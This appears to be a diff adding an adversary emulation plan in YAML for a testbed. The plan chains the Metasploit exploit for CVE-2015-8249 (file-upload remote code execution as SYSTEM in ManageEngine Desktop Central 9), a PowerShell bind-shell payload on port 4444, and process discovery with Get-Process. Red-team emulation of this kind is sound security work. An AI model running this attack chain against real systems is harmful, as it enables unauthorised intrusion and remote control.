@@ -1,0 +1,114 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-03 05:01:57 UTC+0000
+attack_action_sequence:
+  - uuid: de6091de-bce3-456d-bf1e-0a88936f06ed
+    name: ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
+    id:
+      - T1203
+      - T1068
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Privilege Escalation
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation for Privilege Escalation
+      - Exploitation of Remote Services
+    description: |-
+      This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM. 
+       Please note that by default, some ManageEngine Desktop Central versions run on port 8020, but older ones run on port 8040. Also, using this exploit will leave debugging information produced by FileUploadServlet in file rdslog0.txt. 
+       This exploit was successfully tested on version 9, build 90109 and build 91084.
+    testbed:
+      CVE:
+        - CVE-2015-8249
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("windows/http/manageengine_connectionid_write")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 8020
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      TARGETURI:
+        CurrentSetting: /
+        Required: true
+        Description: The base path for ManageEngine Desktop Central
+  - uuid: fda40b30-8f0b-438e-ad2d-b7429d1600d5
+    name: Windows Interactive Powershell Session, Bind TCP
+    id:
+      - T1059.001
+      - T1071.001
+    source: Metasploit Payload
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - T1059.001
+      - T1071.001
+    description: Listen for a connection and spawn an interactive powershell session
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("windows/powershell_bind_tcp")
+    arguments:
+      EXITFUNC:
+        CurrentSetting: process
+        Required: true
+        Description: "Exit technique (Accepted: '', seh, thread, process, none)"
+      LOAD_MODULES:
+        CurrentSetting: ''
+        Required: false
+        Description: A list of powershell modules separated by a comma to download
+          over the web
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+  - uuid: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34
+    name: Process Discovery - Get-Process
+    id:
+      - T1057
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique:
+      - Process Discovery
+    description: |
+      Utilize Get-Process PowerShell cmdlet to identify processes.
+
+      Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
+    execution:
+      executor: Powershell Executor
+      command: |
+        Get-Process
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2015-8249
